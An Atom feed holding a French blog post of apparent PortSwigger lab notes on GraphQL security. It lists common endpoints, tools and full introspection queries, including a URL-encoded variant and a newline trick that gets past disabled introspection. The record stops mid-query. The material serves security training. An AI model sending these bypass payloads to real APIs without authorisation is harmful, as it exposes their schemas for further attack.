<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="fr_FR"><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="fr_FR" /><updated>2024-04-05T09:23:41+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Denverledinosor</title><subtitle>Ce blog est à moi</subtitle><entry><title type="html">Graphql</title><link href="http://localhost:4000/api/Graphql/" rel="alternate" type="text/html" title="Graphql" /><published>2024-04-04T12:35:09+02:00</published><updated>2024-04-04T12:35:09+02:00</updated><id>http://localhost:4000/api/Portswigger%20Graphql</id><content type="html" xml:base="http://localhost:4000/api/Graphql/">&lt;h1 id=&quot;portswigger-graphql&quot;&gt;Portswigger Graphql&lt;/h1&gt;

&lt;p&gt;GraphQL est un langage api fait pour simplifier la communication client-server.&lt;/p&gt;

&lt;p&gt;Cela permet au client de spécifier leformat et la donnée de la réponse permettant d’éviter une quantité de réponse inutile et des appels répété sur l’API REST.
GraphQL est souvent utilisé pour de l’authentification.&lt;/p&gt;

&lt;p&gt;La plupart des enpoints GraphQL sont :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/graphql&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/api&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/api/graphql&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/graphql/api&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/graphql/graphql&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/graphql/v1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;ressources&quot;&gt;Ressources&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Visualiser&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://nathanrandal.com/graphql-visualizer/&quot;&gt;http://nathanrandal.com/graphql-visualizer/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://graphql-kit.com/graphql-voyager/&quot;&gt;https://graphql-kit.com/graphql-voyager/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Tool&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/swisskyrepo/GraphQLmap&quot;&gt;https://github.com/swisskyrepo/Grap…&lt;/a&gt; : Repo de l’outil GraphQLmap développé par @Swissky.&lt;/li&gt;
  &lt;li&gt;ToolBurpsuite&lt;/li&gt;
  &lt;li&gt;Extension : InQL&lt;/li&gt;
  &lt;li&gt;Documentation&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql&quot;&gt;https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.vaadata.com/blog/fr/exploitation-dun-manque-de-controle-de-droits-sur-graphql/&quot;&gt;https://www.vaadata.com/blog/fr/exploitation-dun-manque-de-controle-de-droits-sur-graphql/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/uploads/Portswigger Graphql/Untitled.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.notion.so&quot;&gt;https://www.notion.so&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/uploads/Portswigger Graphql/Untitled 1.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;L’introspection est une option proposée par GraphQL permettant d’établir un schéma de la base. Cela permet de développer la plateforme plus simplement
Exemple 1 ou l’on injecte directement l’introspection dans l’onglet GraphQL de Burp&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/uploads/Portswigger Graphql/Untitled 2.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Exemple 2 :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/uploads/Portswigger Graphql/Untitled 3.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Mais il existe aussi le cas où l’endpoint GraphQL est caché ainsi nous pouvons aussi encoder la requête dans l’url :&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;sr&quot;&gt;/api&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;query=query+IntrospectionQuery+%7B%0A++__schema+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;A
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Prenons le cas où l’introspection est désactivé.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;sr&quot;&gt;/api&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;A
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/uploads/Portswigger Graphql/Untitled 4.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Il est encore possible d’utiliser la fonctionnalité de suggestion pour établir un schéma.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  #Full introspection query

query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
         ...FullType
        }
        directives {
            name
            description
            args {
                ...InputValue
        }
        onOperation  #Often needs to be deleted to run query
        onFragment   #Often needs to be deleted to run query
        onField      #Often needs to be deleted to run query
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;__schema&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;queryType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mutationType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;types&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;includeDeprecated&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;defaultValue&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;isDeprecated&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;deprecationReason&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;inputFields&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;defaultValue&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;interfaces&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ofType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;enumValues&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;includeDeprecated&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
